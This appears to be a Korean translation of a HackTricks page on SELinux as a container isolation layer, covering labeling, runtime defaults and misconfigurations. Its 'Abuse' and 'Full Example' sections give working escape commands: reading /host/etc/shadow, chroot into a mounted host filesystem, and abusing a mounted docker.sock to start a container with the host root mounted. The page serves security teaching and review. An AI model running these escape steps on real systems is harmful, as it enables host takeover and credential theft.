# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux는 **레이블 기반의 강제 접근 제어(Mandatory Access Control)** 시스템이다. 관련된 모든 프로세스와 객체는 보안 컨텍스트를 가질 수 있으며, 정책은 어떤 도메인이 어떤 타입과 어떤 방식으로 상호작용할 수 있는지를 결정한다. 컨테이너화된 환경에서는 보통 런타임이 컨테이너 프로세스를 제한된 컨테이너 도메인으로 실행하고, 컨테이너 내용물에 대응되는 타입으로 레이블을 붙인다는 뜻이다. 정책이 제대로 동작하면, 프로세스는 레이블이 접근하도록 예상된 항목은 읽고 쓸 수 있지만, 그러한 내용물이 마운트를 통해 보이게 되더라도 다른 호스트 콘텐츠에 대한 접근은 거부된다.

이는 주류 Linux 컨테이너 배포에서 사용 가능한 호스트 측 보호 기능 중 가장 강력한 것들 중 하나다. 특히 Fedora, RHEL, CentOS Stream, OpenShift 및 기타 SELinux 중심 생태계에서는 매우 중요하다. 그런 환경에서는 SELinux를 무시하는 리뷰어가 명백해 보이는 호스트 권한 탈취 경로가 실제로는 차단되는 이유를 종종 오해하게 된다.

## AppArmor Vs SELinux

가장 쉬운 상위 수준 차이는 AppArmor가 경로 기반(path-based)인 반면 SELinux는 **레이블 기반(label-based)**이라는 것이다. 이는 컨테이너 보안에 큰 영향을 준다. 경로 기반 정책은 동일한 호스트 콘텐츠가 예상치 못한 마운트 경로 아래에 보이게 되면 다르게 동작할 수 있다. 레이블 기반 정책은 대신 객체의 레이블이 무엇인지, 그리고 프로세스 도메인이 그것에 대해 무엇을 할 수 있는지를 묻는다. 이것이 SELinux를 단순하게 만들지는 않지만, AppArmor 기반 시스템에서 방어자가 때때로 무심코 하는 경로 조작(path-trick) 가정들에 대해 강인하게 만든다.

모델이 레이블 지향이기 때문에, 컨테이너 볼륨 처리와 재레이블링(relabeling) 결정은 보안상 중요하다. 만약 런타임이나 운영자가 마운트를 "make mounts work"하기 위해 레이블을 지나치게 넓게 변경하면, 워크로드를 격리하기 위해 의도된 정책 경계가 예상보다 훨씬 약해질 수 있다.

## Lab

호스트에서 SELinux가 활성화되어 있는지 확인하려면:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
호스트에서 기존 레이블을 검사하려면:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
레이블링이 비활성화된 실행과 정상 실행을 비교하려면:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman은 SELinux가 플랫폼 기본값인 시스템과 특히 잘 맞는다. Rootless Podman과 SELinux의 조합은 프로세스가 이미 호스트 측에서 비특권 상태이고 여전히 MAC 정책으로 제한되기 때문에 가장 강력한 주류 컨테이너 기본 구성 중 하나이다. Docker도 지원되는 환경에서는 SELinux를 사용할 수 있지만, 관리자가 볼륨 라벨링 문제를 회피하기 위해 이를 비활성화하는 경우가 있다. CRI-O와 OpenShift는 컨테이너 격리 관점에서 SELinux에 크게 의존한다. Kubernetes도 SELinux 관련 설정을 노출할 수 있지만, 그 유용성은 노드 OS가 실제로 SELinux를 지원하고 강제하는지에 따라 달라진다.

반복되는 교훈은 SELinux가 선택적 장식물이 아니라는 것이다. SELinux를 중심으로 구축된 생태계에서는 그것이 기대되는 보안 경계의 일부이다.

## Misconfigurations

고전적인 실수는 `label=disable`이다. 운영상으로는 볼륨 마운트가 거부되었고 라벨링 모델을 고치는 대신 단기적으로 SELinux를 제외시키는 것이 가장 빠른 해결책이라고 판단할 때 이런 일이 자주 발생한다. 또 다른 흔한 실수는 호스트 콘텐츠를 잘못 재라벨링하는 것이다. 광범위한 재라벨 작업은 애플리케이션을 작동시킬 수 있지만, 컨테이너가 접근할 수 있는 범위를 원래 의도보다 훨씬 넓힐 수도 있다.

또한 **설치된** SELinux와 **유효한(effective)** SELinux를 혼동하지 않는 것이 중요하다. 호스트가 SELinux를 지원하더라도 permissive 모드에 있을 수 있고, 런타임이 워크로드를 예상된 도메인으로 실행하지 않을 수도 있다. 그런 경우 보호는 문서가 암시하는 것보다 훨씬 약하다.

## Abuse

SELinux가 없거나 permissive 상태이거나 워크로드에 대해 광범위하게 비활성화되어 있으면, 호스트에 마운트된 경로는 훨씬 더 쉽게 악용될 수 있다. 라벨로 제한되었을 동일한 bind mount가 호스트 데이터 접근이나 호스트 변경의 직접적인 경로가 될 수 있다. 이는 특히 쓰기 가능한 볼륨 마운트, container runtime 디렉토리, 또는 편의를 위해 민감한 호스트 경로를 노출한 운영상의 단축과 결합될 때 관련성이 크다.

SELinux는 종종 왜 어떤 호스트에서는 일반적인 breakout writeup이 즉시 작동하는데 다른 호스트에서는 런타임 플래그가 비슷해 보여도 반복해서 실패하는지를 설명해준다. 누락된 요소는 종종 네임스페이스나 capability가 아니라, 그대로 유지된 라벨 경계다.

가장 빠른 실용적 점검은 활성 컨텍스트를 비교한 다음 보통 라벨로 제한되는 마운트된 호스트 경로나 runtime 디렉토리를 검사해 보는 것이다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
호스트 bind mount가 존재하고 SELinux 라벨링이 비활성화되었거나 약화된 경우, 정보 노출이 종종 먼저 발생합니다:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
마운트가 쓰기 가능하고 컨테이너가 커널 관점에서 사실상 호스트 루트인 경우, 다음 단계는 추측하는 대신 제어된 방식으로 호스트 수정을 테스트하는 것입니다:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux-capable 호스트에서는 런타임 상태 디렉터리의 labels가 사라지면 직접적인 privilege-escalation 경로가 노출될 수 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
이 명령들은 full escape chain을 대체하지는 않지만, SELinux가 host data 접근이나 host-side file modification을 막고 있었는지 매우 빠르게 확인해준다.

### Full Example: SELinux Disabled + Writable Host Mount

SELinux labeling이 비활성화되어 있고 호스트 파일시스템이 `/host`에 쓰기 가능하도록 마운트되어 있다면, full host escape는 일반적인 bind-mount abuse 사례가 된다:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
만약 `chroot`가 성공하면, 컨테이너 프로세스는 이제 호스트 파일시스템에서 작동합니다:
```bash
id
hostname
cat /etc/passwd | tail
```
### 전체 예시: SELinux 비활성화 + 런타임 디렉터리

레이블이 비활성화된 상태에서 워크로드가 런타임 소켓에 접근할 수 있다면, 탈출은 런타임으로 위임될 수 있습니다:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
관련 관찰은 SELinux가 종종 바로 이러한 종류의 host-path 또는 runtime-state 접근을 차단하는 제어 수단이라는 점이다.

## 확인

SELinux 검사의 목적은 SELinux가 활성화되어 있는지 확인하고, 현재 보안 컨텍스트를 식별하며, 관심 있는 파일이나 경로가 실제로 라벨로 제약되어 있는지 확인하는 것이다.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
여기서 주목할 점:

- `getenforce`는 이상적으로 `Enforcing`를 반환해야 합니다; `Permissive`나 `Disabled`는 SELinux 섹션 전체의 의미를 바꿉니다.
- 현재 프로세스 컨텍스트가 예상과 다르거나 너무 광범위해 보이면, 워크로드가 의도된 컨테이너 정책(container policy) 아래에서 실행되지 않을 수 있습니다.
- 호스트에 마운트된 파일이나 런타임 디렉터리의 라벨을 프로세스가 너무 자유롭게 접근할 수 있다면, bind mounts는 훨씬 더 위험해집니다.

SELinux를 지원하는 플랫폼에서 컨테이너를 검토할 때 라벨링을 부차적인 세부사항으로 취급하지 마세요. 많은 경우 라벨링이 호스트가 아직 침해되지 않은 주요한 이유 중 하나입니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux 분리는 SELinux가 활성화된 호스트에서 가능하지만, 정확한 동작은 호스트/데몬 구성에 따라 달라집니다 | `--security-opt label=disable`, bind mounts의 광범위한 relabeling, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux 시스템에서 Podman의 정상적인 일부로, 비활성화하지 않는 한 SELinux 분리가 기본입니다 | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux 지원은 존재하지만, Pods는 보통 `securityContext.seLinuxOptions` 또는 플랫폼별 기본값이 필요하며 런타임과 노드의 지원이 필요합니다 | 약하거나 광범위한 `seLinuxOptions`, permissive/disabled 노드에서 실행, 라벨링을 비활성화하는 플랫폼 정책 |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | 이러한 환경에서는 SELinux가 노드 격리 모델의 핵심인 경우가 많습니다 | 접근 권한을 지나치게 넓히는 커스텀 정책, 호환성을 위해 라벨링을 비활성화 |

SELinux의 기본값은 seccomp 기본값보다 배포판에 더 의존적입니다. Fedora/RHEL/OpenShift 스타일 시스템에서는 SELinux가 격리 모델의 중심인 경우가 많습니다. SELinux 비사용 시스템에서는 단순히 존재하지 않습니다.
{{#include ../../../../banners/hacktricks-training.md}}
